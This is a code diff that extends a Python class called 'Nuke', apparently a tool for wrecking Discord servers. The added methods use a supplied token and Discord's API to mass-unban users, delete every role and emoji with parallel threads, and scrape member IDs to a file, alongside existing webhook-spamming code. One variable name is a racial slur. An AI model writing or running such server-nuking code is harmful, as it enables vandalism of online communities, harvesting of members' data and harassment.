@@ -30,10 +30,12 @@ useembed = conf.get('embed', False)
 
 def cls():
     os.system('cls')
+    
 def loadids():
     with open('shi/exids.txt', 'r', encoding='utf-8') as f:
         ids = f.read().splitlines()
         return ids
+        
 class Nuke:
     def __init__(self, tkn, server, serverid, wbh=':3', embeds=False, ban=False, webhook=False):
         self.tkn = tkn
@@ -676,3 +678,136 @@ class Nuke:
         elif type.lower() == 'no rename':
             self.SpamWebhooks2(msg, amount)
             
+
+    def fetchbanned(self):
+        try:
+            r = requests.get(f'https://discord.com/api/v9/guilds/{self.serverid}/bans', headers=self.headers, params={'limit': 1000})
+            if r.status_code in [200, 201, 204]:
+                Logging.success('Successfully fetched banned users')
+                return r.json()
+            elif r.status_code == 429:
+                Logging.info('Rate limit while trying to fetch banned users')
+                return []
+            else:
+                Logging.fail(f'Failed to fetch banned users, {r.status_code} - {r.text}')
+                return []
+        except Exception as e:
+            Logging.fail(f'Failed to fetch banned users, {e}')
+            return []
+        
+    def unban(self, id):
+        try:
+            r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/bans/{id}', headers=self.headers)
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Successfully unbanned {id}')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to unban {id}')
+            else:
+                Logging.fail(f'Failed to unban {id}, {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to unban user - {e}')
+    
+    def UnbanAll(self):
+        threads = []
+        members = []
+        
+        banned = self.fetchbanned()
+        for id in banned:
+            members.append(id['user']['id'])
+        
+        for member in members:
+            t = threading.Thread(target=self.unban, args=(member,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+            
+        for t in threads:
+            t.join()
+    
+    def fetchroles(self):
+        try:
+            r = requests.get(f'https://discord.com/api/v9/guilds/{self.serverid}/roles', headers=self.headers)
+            if r.status_code in [200, 201, 204]:
+                return r.json()
+            elif r.status_code == 429:
+                Logging.fail(f'Rate limit response while trying to fetch roles')
+                return []
+            else:
+                Logging.fail(f'Failed to fetch roles, {r.status_code}, {r.text}')
+                return []
+        except Exception as e:
+            Logging.fail(f'Failed to fetch roles, {e}')
+            return []
+    
+    def deleterole(self, id):
+        try:
+            r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/roles/{id}', headers=self.headers)
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Successfully deleted role, {id}')
+            elif r.status_code in 429:
+                Logging.fail(f'Rate limit while trying to delete role {id}')                
+            else:
+                Logging.fail(f'Failed to delete role {id}, {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to delete role {id}: {e}')
+            
+    def DeleteRoles(self):
+        roles = []
+        fetch = self.fetchroles()
+        for rl in fetch:
+            if not rl['id'] == self.serverid and not rl['managed']:
+                roles.append(rl['id'])
+                
+        for role in roles:
+            self.deleterole(role)
+            
+    def scrapemembers(self):
+        members = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
+        if nig.status_code in [200, 201, 204]:
+            m = nig.json()
+            for mem in m:
+                id = mem['user']['id']
+                members.append(id)
+
+        with open('shi/scraped.txt', 'a', encoding='utf-8') as f:
+            for member in members:
+                f.write(member + '\n')
+        Logging.success(f'Successfully scraped {len(members)} ids and wrote them to scraped.txt')
+        
+    def getemojis(self):
+        try:
+            r = requests.get(f'https://discord.com/api/v9/guilds/{self.serverid}/emojis', headers=self.headers)
+            if r.status_code in [200, 201, 204]:
+                return r.json()
+            else:
+                return []
+        except:
+            return []
+    
+    def DeleteEmojis(self):
+        emojis = []
+        eids = self.getemojis()
+        threads = []
+        def deleteemoji(id, name):
+            try:
+                r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/emojis/{id}', headers=self.headers)
+                if r.status_code in [200, 201, 204]:
+                    Logging.success(f'Deleted emoji {id} {name}')
+                elif r.status_code == 429:
+                    Logging.info(f'Rate limit response while trying to delete emoji {id} {name}')
+                else:
+                    Logging.fail(f'Failed to delete emoji {id} {name} - {r.status_code} - {r.text}')
+            except Exception as e:
+                Logging.fail(f'Failed to delete emoji {id} {name} - {e}')
+                
+        for efn in eids:
+            name = efn['name']
+            id = efn['id']
+            t = threading.Thread(target=deleteemoji, args=(id, name,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        for t in threads:
+            t.join()
